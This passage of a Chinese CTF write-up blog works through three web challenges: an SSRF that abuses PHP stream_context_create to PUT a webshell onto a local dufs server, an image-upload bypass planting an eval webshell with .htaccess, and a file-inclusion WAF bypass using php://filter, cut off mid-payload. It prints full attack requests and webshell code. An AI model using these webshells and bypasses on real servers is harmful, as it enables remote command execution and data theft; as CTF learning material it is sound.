#ddd;&quot;&gt;修改时间&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;大小&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;操作&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>                            <br>                            jsonData.paths.<span class="hljs-title function_ invoke__">forEach</span>(function(item) &#123;<br>                                <span class="hljs-keyword">var</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(item.mtime);<br>                                <span class="hljs-keyword">var</span> formattedDate = date.<span class="hljs-title function_ invoke__">toLocaleString</span>();<br>                                <span class="hljs-keyword">var</span> fileSize = <span class="hljs-title function_ invoke__">formatFileSize</span>(item.size);<br>                                <br>                                resultHtml += <span class="hljs-string">&#x27;&lt;tr style=&quot;border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + item.name + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + formattedDate + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + fileSize + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;button onclick=&quot;viewFile(\&#x27;&#x27;</span> + item.name + <span class="hljs-string">&#x27;\&#x27;)&quot; style=&quot;margin-right: 5px;&quot;&gt;查看&lt;/button&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>                            &#125;);<br>                            <br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = resultHtml;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;没有找到匹配的图片&lt;/p&gt;&#x27;</span>;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;解析结果时出错&lt;/p&gt;&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;错误: &#x27;</span> + data.message + <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;搜索过程中发生错误&lt;/p&gt;&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">var</span> fileContentDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>);<br>                    fileContentDiv.textContent = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>                    <span class="hljs-keyword">var</span> img = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<br>                    img.src = data.base64_data;<br>                    img.style.maxWidth = <span class="hljs-string">&#x27;100%&#x27;</span>;<br>                    img.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                    img.style.margin = <span class="hljs-string">&#x27;0 auto&#x27;</span>;<br>                    fileContentDiv.<span class="hljs-title function_ invoke__">appendChild</span>(img);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;错误: &#x27;</span> + data.message;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                console.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;错误:&#x27;</span>, error);<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;获取图片时发生错误&#x27;</span>;<br>            &#125;);<br>        &#125;);<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">formatFileSize</span>(<span class="hljs-params">bytes</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0 B&#x27;</span>;<br>            <br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">k</span> = <span class="hljs-number">1024</span>;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sizes</span> = [<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;KB&#x27;</span>, <span class="hljs-string">&#x27;MB&#x27;</span>, <span class="hljs-string">&#x27;GB&#x27;</span>, <span class="hljs-string">&#x27;TB&#x27;</span>];<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">i</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">log</span>(bytes) / Math.<span class="hljs-title function_ invoke__">log</span>(k));<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">parseFloat</span>((bytes / Math.<span class="hljs-title function_ invoke__">pow</span>(k, i)).<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>)) + <span class="hljs-string">&#x27; &#x27;</span> + sizes[i];<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">viewFile</span>(<span class="hljs-params">filename</span>) </span>&#123;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;filename&#x27;</span>).value = filename;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">&#x27;submit&#x27;</span>));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>当时得到源码后不会做了  </p><p>赛后看官方解法：</p><p>ssrf</p><p>index.php在查看图片时使用file_get_contents获取任意文件并且以data:image&#x2F;jpeg;base64的形式返回，通过这种方式可以尝试读源码 源码中预留了带有dufs的变量名以及上传和搜索的流量特征都可以给选手推测的机会，选手如果运气好遍历到文件甚至可以直接下载到dufs的Linux二进制文件自行进行测试 同时，源码的file_get_contents还预留了options变量，这意味着可以通过此函数进行PUT请求上传任意文件，从而绕过php脚本的限制上传php木马getshell，之后从环境变量获取flag即可</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file_content = <span class="hljs-symbol">@file_get_contents</span>($filename, <span class="hljs-literal">false</span>, <span class="hljs-symbol">@stream_context_create</span>($_POST[<span class="hljs-string">&#x27;options&#x27;</span>]))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>攻击payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">83</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4103</span>.<span class="hljs-number">116</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">9</span><br><br><span class="hljs-attribute">action</span>=view&amp;filename=http://<span class="hljs-number">127.0.0.1:5000</span>/i.php&amp;options[http][method]=PUT&amp;options[http][content]=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+echo+getenv%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>FLAG%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><p>传入部分url解码内容：<br><?php echo getenv('FLAG');?>   </p><p>原 http 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50688<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>245<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEFvaPBTZNbCkhtbn<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">view</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;filename&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">index</span>.php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>关键利用代码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>这段代码会让stream_context_create函数接收post上来的option参数</p><p>关键来理解一下这份payload：  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">action=view&amp;filename=http://127.0.0.1:5000/shell.php&amp;options[http][method]=PUT&amp;options[http][content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>利用view操作来绕过upload操作的waf<br>源码的查看图片利用的是 file_get_contents() 支持http协议，用它来触发ssrf来向dufs(文件服务器来上传文件，而通过index.php的源码可以知道dufs文件服务运行在本地5000端口上)目录直接上传文件  </p><h2 id="options-http-method-PUT"><a href="#options-http-method-PUT" class="headerlink" title="options[http][method]&#x3D;PUT"></a><strong>options[http][method]&#x3D;PUT</strong></h2><p>用途：通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）。</p><p>攻击逻辑：</p><p>[method]&#x3D;PUT：将 HTTP 请求方法从默认的 GET 改为 PUT。</p><p>PUT 方法的作用：向服务器上传文件（需目标服务支持，如 dufs 允许 PUT 上传文件）。</p><p>为什么重要：通过此参数绕过常规文件上传限制，直接写入文件。<br>通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）将原来请求的GET改为PUT以向dufs服务上传木马  </p><h2 id="options-http-content-php-system-GET-‘a’"><a href="#options-http-content-php-system-GET-‘a’" class="headerlink" title="options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;"></a>options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;</h2><p>用途：设置 HTTP 请求的 Body 内容（即上传的文件内容）。</p><p>攻击逻辑：</p><?php system($_GET['a']);?><p>：一个简短的 PHP Webshell。</p><p>system()：执行系统命令。</p><p>$_GET[‘a’]：从 URL 参数 a 中接收用户输入的命令。</p><p>例如：访问 <a href="http://127.0.0.1:5000/shell.php?a=ls">http://127.0.0.1:5000/shell.php?a=ls</a> 会执行 ls 命令。</p><p>关键作用：将恶意代码写入服务器的 shell.php 文件，为后续攻击做准备。</p><h2 id="完整攻击流程"><a href="#完整攻击流程" class="headerlink" title="完整攻击流程"></a>完整攻击流程</h2><p>1.触发 SSRF   </p><p>服务器执行 file_get_contents 时，尝试读取 <a href="http://127.0.0.1:5000/shell.php">http://127.0.0.1:5000/shell.php</a><br>但实际发起的是一个 PUT 请求。</p><p>2.上传 Webshell</p><p>请求内容为：<br>此时用stream_context_create构建的http请求应该就是如下了：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/shell.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>PUT请求将会将shell.php和其指定内容写入dufs  </p><p>如果 dufs 允许 PUT 上传，shell.php 会被写入服务器。</p><p>所以第一个option用来定义put的http请求，第二个option用来定义http主体</p><p>接下来就是蚂蚁连马然后再环境变量里看到flag</p><h2 id="stream-context-create"><a href="#stream-context-create" class="headerlink" title="stream_context_create"></a>stream_context_create</h2><p>stream_context_create 是 PHP 中用于创建流上下文（stream context）的函数，它允许开发者在执行文件、网络或其他流操作时，自定义底层协议的行为（例如设置 HTTP 请求头、修改 FTP 传输模式等）。这个函数在实现复杂网络操作时非常有用，但如果使用不当，也可能引发安全漏洞（如 SSRF、文件上传绕过等）。</p><p>数的基本语法:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">stream_context_create(array $options = ?,<span class="hljs-built_in"> array </span>$params = ?): resource<br></code></pre></td></tr></table></figure><p>参数：</p><p>$options：一个多维数组，用于配置不同协议（如 http、ftp、ssl 等）的行为。</p><p>$params（可选）：设置上下文参数（如超时时间）。</p><p>返回值：返回一个流上下文资源，可传递给其他流操作函数（如 file_get_contents、fopen）。</p><h1 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1><p>传正常图片，得到路径<br>然后试试直接传码，不行<br>修改请求头： </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>354<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrWwjxZ6YBiFAz2Lm<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748528050; HMACCOUNT=1B73E9281BD50EC7; PHPSESSID=fve350i8dhj45k2ls9htd4l6r5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;shell.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">这不传一个🐎？</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm--</span></span><br></code></pre></td></tr></table></figure><p>然后传.htaccess</p><p>蚂蚁直接连<br>env查看环境的到flag</p><h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>上来能看到给出的源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-comment">//flag in /var/www/html/flag.php;</span><br></code></pre></td></tr></table></figure><p>直接传入flag&#x3D;flag.php<br>提示有waf<br>使用php伪协议结果一样<br>尝试读取index.php完整源码<br>flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;code&gt;&lt;span style=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;<br>&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-keyword">__FILE__</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);&lt;br /&gt;<span class="hljs-keyword">include</span>(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;<span class="hljs-string">&quot;flag&quot;</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;<span class="hljs-comment">//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span><br>&lt;/span&gt;<br>&lt;/code&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure><p>看deepseek解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>))<br></code></pre></td></tr></table></figure><p>其中有&amp;&amp;效果与and相同，若是两个条件达成就会执行if<br>其中第一条是请求体长度小于800，第二是传入中含有flag字符<br>只要让其中一条为假就能绕过waf<br>所以让post的请求体长度大于800即可<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag=php:<span class="hljs-regexp">//</span>filter<span 